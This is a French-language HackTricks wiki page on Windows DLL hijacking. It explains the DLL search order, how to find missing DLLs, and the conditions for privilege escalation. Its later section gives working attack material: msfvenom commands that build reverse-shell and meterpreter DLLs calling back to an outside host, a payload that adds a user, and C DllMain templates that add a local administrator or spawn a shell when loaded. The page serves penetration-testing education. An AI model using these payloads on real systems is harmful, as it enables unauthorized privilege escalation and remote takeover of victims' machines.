# Dll Hijacking

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos GitHub.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Astuce bug bounty** : **inscrivez-vous** sur **Intigriti**, une plateforme de **bug bounty premium créée par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## Informations de base

Le DLL Hijacking implique de manipuler une application de confiance pour charger un DLL malveillant. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, et Side-Loading**. Il est principalement utilisé pour l'exécution de code, l'obtention de persistance et, moins couramment, l'escalade de privilèges. Malgré l'accent mis sur l'escalade ici, la méthode de détournement reste cohérente à travers les objectifs.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune ayant son efficacité selon la stratégie de chargement de DLL de l'application :

1. **Remplacement de DLL** : Échanger un DLL authentique avec un malveillant, en utilisant éventuellement le DLL Proxying pour préserver la fonctionnalité du DLL original.
2. **Détournement de l'ordre de recherche de DLL** : Placer le DLL malveillant dans un chemin de recherche avant le légitime, exploitant le modèle de recherche de l'application.
3. **Détournement de DLL fantôme** : Créer un DLL malveillant pour qu'une application le charge, pensant qu'il s'agit d'un DLL requis non existant.
4. **Redirection de DLL** : Modifier des paramètres de recherche comme `%PATH%` ou des fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers le DLL malveillant.
5. **Remplacement de DLL WinSxS** : Substituer le DLL légitime par un équivalent malveillant dans le répertoire WinSxS, une méthode souvent associée au side-loading de DLL.
6. **Détournement de DLL par chemin relatif** : Placer le DLL malveillant dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques d'exécution de proxy binaire.

## Trouver des DLL manquantes

La manière la plus courante de trouver des DLL manquantes dans un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **en définissant** les **2 filtres suivants** :

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

et montrer uniquement l'**activité du système de fichiers** :

![](<../../../.gitbook/assets/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, vous **laissez** cela fonctionner pendant quelques **secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable spécifique**, vous devez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter et arrêter la capture des événements**.

## Exploiter les DLL manquantes

Pour escalader les privilèges, la meilleure chance que nous avons est de pouvoir **écrire un DLL qu'un processus privilégié essaiera de charger** dans un des **endroits où il sera recherché**. Par conséquent, nous pourrons **écrire** un DLL dans un **dossier** où le **DLL est recherché avant** le dossier où le **DLL original** se trouve (cas étrange), ou nous pourrons **écrire dans un dossier où le DLL va être recherché** et le **DLL original n'existe pas** dans aucun dossier.

### Ordre de recherche de DLL

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les DLL sont chargées spécifiquement.**

**Les applications Windows** recherchent des DLL en suivant un ensemble de **chemins de recherche prédéfinis**, respectant une séquence particulière. Le problème du DLL hijacking survient lorsqu'un DLL nuisible est stratégiquement placé dans l'un de ces répertoires, garantissant qu'il soit chargé avant le DLL authentique. Une solution pour prévenir cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir l'**ordre de recherche de DLL sur les systèmes 32 bits** ci-dessous :

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'existe pas de fonction qui obtienne le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires qui sont listés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche de DLL.

C'est l'**ordre de recherche par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant passe au deuxième rang. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (par défaut, elle est activée).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'**un DLL pourrait être chargé en indiquant le chemin absolu au lieu du nom**. Dans ce cas, ce DLL est **uniquement recherché dans ce chemin** (si le DLL a des dépendances, elles seront recherchées comme si elles étaient chargées par nom).

Il existe d'autres façons de modifier l'ordre de recherche, mais je ne vais pas les expliquer ici.

#### Exceptions à l'ordre de recherche de DLL selon la documentation Windows

Certaines exceptions à l'ordre de recherche standard des DLL sont notées dans la documentation Windows :

* Lorsqu'un **DLL qui partage son nom avec un déjà chargé en mémoire** est rencontré, le système contourne la recherche habituelle. Au lieu de cela, il effectue une vérification de redirection et un manifeste avant de se rabattre sur le DLL déjà en mémoire. **Dans ce scénario, le système ne procède pas à une recherche du DLL**.
* Dans les cas où le DLL est reconnu comme un **DLL connu** pour la version actuelle de Windows, le système utilisera sa version du DLL connu, ainsi que toutes ses DLL dépendantes, **en omettant le processus de recherche**. La clé de registre **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient une liste de ces DLL connues.
* Si un **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **noms de module**, peu importe si le DLL initial a été identifié par un chemin complet.

### Escalader les privilèges

**Exigences** :

* Identifier un processus qui fonctionne ou fonctionnera sous **différents privilèges** (mouvement horizontal ou latéral), qui **manque d'un DLL**.
* Assurez-vous qu'un **accès en écriture** est disponible pour tout **répertoire** dans lequel le **DLL** sera **recherché**. Cet emplacement pourrait être le répertoire de l'exécutable ou un répertoire dans le chemin système.

Oui, les exigences sont compliquées à trouver car **par défaut, il est un peu étrange de trouver un exécutable privilégié manquant d'un DLL** et c'est encore **plus étrange d'avoir des permissions d'écriture sur un dossier de chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
Dans le cas où vous avez de la chance et que vous remplissez les exigences, vous pourriez vérifier le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **principal objectif du projet est de contourner UAC**, vous pourriez y trouver un **PoC** d'un DLL hijacking pour la version de Windows que vous pouvez utiliser (probablement juste en changeant le chemin du dossier où vous avez des permissions d'écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les autorisations de tous les dossiers à l'intérieur de PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec :
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la façon d'**abuser de Dll Hijacking pour élever les privilèges** avec des permissions d'écriture dans un **dossier de chemin système**, consultez :

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur n'importe quel dossier à l'intérieur du chemin système.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera de celui-ci**. Quoi qu'il en soit, notez que Dll Hijacking est utile pour [escalader du niveau d'intégrité moyen au niveau élevé **(en contournant UAC)**](../../authentication-credentials-uac-and-efs/#uac) ou de [**l'intégrité élevée au SYSTÈME**](../#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer un dll valide** dans cette étude de dll hijacking axée sur le dll hijacking pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous pouvez trouver quelques **codes dll de base** qui pourraient être utiles comme **modèles** ou pour créer un **dll avec des fonctions non requises exportées**.

## **Création et compilation de Dlls**

### **Proxy Dll**

Fondamentalement, un **proxy Dll** est un Dll capable d'**exécuter votre code malveillant lorsqu'il est chargé** mais aussi d'**exposer** et de **fonctionner** comme **prévu** en **relayant tous les appels à la véritable bibliothèque**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer un dll proxifié** ou **indiquer le Dll** et **générer un dll proxifié**.

### **Meterpreter**

**Obtenir un shell rev (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenez un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n'ai pas vu de version x64) :**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui vont être chargées par le processus victime, si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Références

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Astuce bug bounty** : **inscrivez-vous** sur **Intigriti**, une **plateforme de bug bounty premium créée par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez à gagner des récompenses allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
